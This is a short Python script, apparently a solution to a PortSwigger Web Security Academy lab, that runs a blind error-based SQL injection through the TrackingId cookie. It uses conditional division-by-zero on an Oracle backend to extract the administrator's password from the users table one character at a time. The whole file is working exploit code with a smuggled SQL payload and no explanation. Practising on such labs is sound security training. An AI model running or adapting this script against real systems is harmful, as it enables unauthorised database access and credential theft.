import requests
import string

url="https://0af300df048ffd0582035bd20062006d.web-security-academy.net"
tracking_id = "GOhItKobtSllt0hv"
session = "izeNGBqpmCUMkMPpAUFuaLtpT0lrItYZ"
password=""
position=1

new_letter_found = True

while new_letter_found:
	new_letter_found = False
	for c in string.digits + string.ascii_letters:
		possible_password = password + c
		payload = tracking_id + "' and (select case when (substr((select password from users where username='administrator'),1,{})='{}') then 1/0 else 1 end from dual)='1".format(position,possible_password)
		if not requests.get(url,cookies={"TrackingId":payload,"session":session}).ok:
			password = password + c
			print(password)
			position = position + 1
			new_letter_found = True
			break

print("Password = ", password)
	
	
